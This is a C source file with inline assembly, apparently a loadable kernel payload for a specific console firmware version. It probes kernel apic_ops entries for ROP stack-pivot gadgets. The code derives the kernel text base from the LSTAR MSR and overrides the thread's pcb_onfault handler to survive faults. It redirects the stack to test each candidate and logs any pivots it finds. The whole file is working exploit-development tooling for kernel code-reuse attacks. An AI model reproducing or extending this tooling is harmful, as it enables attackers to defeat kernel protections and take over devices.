#include <stdint.h>

/*
 * pivot_scan_safe v3 — single-candidate-per-deploy pivot scanner
 *
 * v1: scanned consecutive bytes → #UD on mid-instruction → panic after 10
 * v2: scanned epilogues (-1,-2,-3) → #BP on CC padding → panic on first
 *
 * v3 approach: ONE probe per deployment. fw_ver encodes which apic_ops
 * entry and which delta to probe. If the probe kills the thread, the
 * kldload host knows exactly which candidate failed and tries the next.
 *
 * fw_ver encoding:
 *   Bits [7:0]   = apic_ops index (0-27)
 *   Bits [15:8]  = probe delta (1=entry-1, 2=entry-2, 3=entry-3)
 *                  0 = default to delta 3 (most interesting: xchg rsp,rax;ret)
 *   Bits [31:16] = mode flags
 *                  0x0000 = single probe
 *                  0x0001 = batch mode: probe ALL entries at the specified delta
 *                           starting from the specified index
 *
 * Examples:
 *   fw_ver = 0x00000300  → probe apic_ops[0] at entry-3
 *   fw_ver = 0x00000305  → probe apic_ops[5] at entry-3
 *   fw_ver = 0x0000010A  → probe apic_ops[10] at entry-1
 *   fw_ver = 0x00010300  → batch: probe ALL entries at delta-3, starting from [0]
 *   fw_ver = 0x00010305  → batch: probe entries at delta-3, starting from [5]
 *
 * Output layout (uint64_t indices):
 *   [0]   magic "PVS3" (0x50565333) | status(32)
 *         status: 0xAAAA=in-progress, 0x0001=done-no-pivot,
 *                 0x0002=pivot-found, 0xFF=error
 *   [1]   kdata_base
 *   [2]   ktext_base
 *   [3]   td_pcb
 *   [4]   apic_ops_index being probed
 *   [5]   delta being probed
 *   [6]   candidate absolute address (the one being/about-to-be probed)
 *   [7]   candidate ktext offset
 *   [8]   apic_ops function entry address
 *   [9]   num_tested (in batch mode)
 *   [10]  num_survived
 *   [11]  num_faulted
 *   [12]  num_pivots
 *   [13]  first pivot ktext offset
 *   [14]  first pivot absolute address
 *   [15]  probe_result (0=normal, 1=pivot, 2=fault)
 *   [16..47] batch results: apic_ops[i] function addr for indices tested
 *            (so you can see which ones survived even if thread dies later)
 *   [48..55] pivot details (if found)
 *   [63]  sentinel 0xdeadbeefcafe0023
 */

#define MAGIC_PVS3    0x50565333  /* "PVS3" */
#define TD_PCB        0x3f8
#define PCB_ONFAULT   0x108

/* FW 4.03 offsets */
#define OFF_NOP_RET        (-0x9d20ca)
#define APIC_OPS_OFF_KTEXT  0x1934AC8
#define NUM_APIC_OPS        28

#define ENTRY_STK_SIZE    32
#define MAX_PIVOTS        8

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t*)addr;
}

/* Shared state between C and asm */
static volatile uint64_t saved_rsp;
static volatile uint64_t onfault_ptr;
static volatile int probe_result;

static volatile uint64_t pivot_chain[8];
static volatile uint64_t entry_stk[ENTRY_STK_SIZE];

__attribute__((naked, used))
static void pivot_landing(void)
{
    __asm__ volatile(
        "movq $1, probe_result(%%rip)\n\t"
        "movq saved_rsp(%%rip), %%rsp\n\t"
        "movq onfault_ptr(%%rip), %%r14\n\t"
        "movq $0, (%%r14)\n\t"
        "jmp .Lprobe_done\n\t"
        ::: "memory"
    );
}

/*
 * Probe a single candidate. Returns:
 *   0 = normal return (survived, no pivot)
 *   1 = pivot detected (RSP redirected)
 *   2 = page fault (recovered via pcb_onfault)
 *   -1 = thread died (never returns — #UD/#GP/#BP)
 */
static int do_probe(uint64_t candidate)
{
    entry_stk[0] = candidate;
    probe_result = 0;

    __asm__ volatile(
        "leaq entry_stk(%%rip), %%rdx\n\t"
        "leaq 1f(%%rip), %%rcx\n\t"
        ".set j, 1\n\t"
        ".rept 31\n\t"
        "movq %%rcx, (j*8)(%%rdx)\n\t"
        ".set j, j+1\n\t"
        ".endr\n\t"

        "movq onfault_ptr(%%rip), %%r14\n\t"
        "leaq 2f(%%rip), %%rcx\n\t"
        "movq %%rcx, (%%r14)\n\t"

        "movq %%rsp, saved_rsp(%%rip)\n\t"
        "leaq pivot_chain(%%rip), %%rax\n\t"
        "leaq entry_stk(%%rip), %%rsp\n\t"
        "retq\n\t"

        "1:\n\t"
        "movq saved_rsp(%%rip), %%rsp\n\t"
        "movq onfault_ptr(%%rip), %%r14\n\t"
        "movq $0, (%%r14)\n\t"
        "jmp .Lprobe_done\n\t"

        "2:\n\t"
        "movq saved_rsp(%%rip), %%rsp\n\t"
        "movq onfault_ptr(%%rip), %%r14\n\t"
        "movq $0, (%%r14)\n\t"
        "movl $2, probe_result(%%rip)\n\t"

        ".globl .Lprobe_done\n\t"
        ".Lprobe_done:\n\t"
        :
        :
        : "rax", "rbx", "rcx", "rdx", "rsi", "rdi",
          "r8", "r9", "r10", "r11", "r14", "r15",
          "memory", "cc"
    );

    return probe_result;
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t fw_ver = args->fw_ver;
    volatile uint64_t* out = (volatile uint64_t*)args;
    volatile uint32_t* out32 = (volatile uint32_t*)args;

    for (int i = 0; i < 64; i++)
        out[i] = 0;

    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t nop_ret = kdata_base + OFF_NOP_RET;

    uint64_t curthread;
    __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
    uint64_t td_pcb = read8(curthread + TD_PCB);

    if (!td_pcb) {
        out32[0] = MAGIC_PVS3;
        out32[1] = 0xFF;
        out[63] = 0xdeadbeefcafe0023ULL;
        return 0;
    }

    onfault_ptr = td_pcb + PCB_ONFAULT;

    /* Parse fw_ver */
    uint32_t apic_idx   = fw_ver & 0xFF;
    uint32_t delta_raw  = (fw_ver >> 8) & 0xFF;
    uint32_t mode_flags = (fw_ver >> 16) & 0xFFFF;
    int delta = (delta_raw == 0) ? 3 : (int)delta_raw;
    int batch_mode = (mode_flags & 1);

    uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_KTEXT;

    /* Header — written before probing */
    out32[0] = MAGIC_PVS3;
    out32[1] = 0xAAAA;  /* in-progress */
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = td_pcb;
    out[5] = (uint64_t)delta;

    /* Set up pivot chain */
    pivot_chain[0] = nop_ret;
    pivot_chain[1] = nop_ret;
    pivot_chain[2] = (uint64_t)pivot_landing;
    pivot_chain[3] = nop_ret;
    pivot_chain[4] = nop_ret;
    pivot_chain[5] = nop_ret;
    pivot_chain[6] = nop_ret;
    pivot_chain[7] = nop_ret;

    if (!batch_mode) {
        /* ===== SINGLE PROBE MODE ===== */
        if (apic_idx >= NUM_APIC_OPS) {
            out32[1] = 0xFF;
            out[63] = 0xdeadbeefcafe0023ULL;
            return 0;
        }

        uint64_t func_addr = read8(apic_ops_addr + apic_idx * 8);
        uint64_t candidate = func_addr - delta;

        out[4] = apic_idx;
        out[6] = candidate;
        out[7] = candidate - ktext_base;
        out[8] = func_addr;

        int result = do_probe(candidate);
        /* If we get here, probe survived (#PF or normal or pivot) */

        out[15] = (uint64_t)result;

        if (result == 1) {
            out32[1] = 0x0002;  /* PIVOT FOUND */
            out[13] = candidate - ktext_base;
            out[14] = candidate;
        } else {
            out32[1] = 0x0001;  /* done, no pivot */
        }

        out[63] = 0xdeadbeefcafe0023ULL;
        return 0;
    }

    /* ===== BATCH MODE ===== */
    /* Probe all apic_ops entries at the specified delta, starting from apic_idx */
    uint32_t num_tested = 0;
    uint32_t num_survived = 0;
    uint32_t num_faulted = 0;
    uint32_t num_pivots = 0;

    for (uint32_t i = apic_idx; i < NUM_APIC_OPS; i++) {
        uint64_t func_addr = read8(apic_ops_addr + i * 8);
        if (func_addr < ktext_base || func_addr > ktext_base + 0x2000000)
            continue;

        uint64_t candidate = func_addr - delta;

        /* Update progress LIVE before probing */
        out[4] = i;
        out[6] = candidate;
        out[7] = candidate - ktext_base;
        out[8] = func_addr;
        out[9] = num_tested + 1;
        out[10] = num_survived;
        out[11] = num_faulted;
        out[12] = num_pivots;

        /* Store function addr in batch results area (survives death) */
        if (i < 28)
            out[16 + i] = func_addr;

        int result = do_probe(candidate);
        num_tested++;

        if (result == 1) {
            if (num_pivots == 0) {
                out[13] = candidate - ktext_base;
                out[14] = candidate;
            }
            num_pivots++;
            /* Store pivot details */
            out[48 + (num_pivots - 1) * 2] = candidate - ktext_base;
            out[48 + (num_pivots - 1) * 2 + 1] = candidate;
        } else if (result == 2) {
            num_faulted++;
        } else {
            num_survived++;
            /* Mark survived in batch results: set bit 63 */
            if (i < 28)
                out[16 + i] |= (1ULL << 63);
        }
    }

    out[9] = num_tested;
    out[10] = num_survived;
    out[11] = num_faulted;
    out[12] = num_pivots;

    out32[1] = (num_pivots > 0) ? 0x0002 : 0x0001;
    out[63] = 0xdeadbeefcafe0023ULL;
    return 0;
}
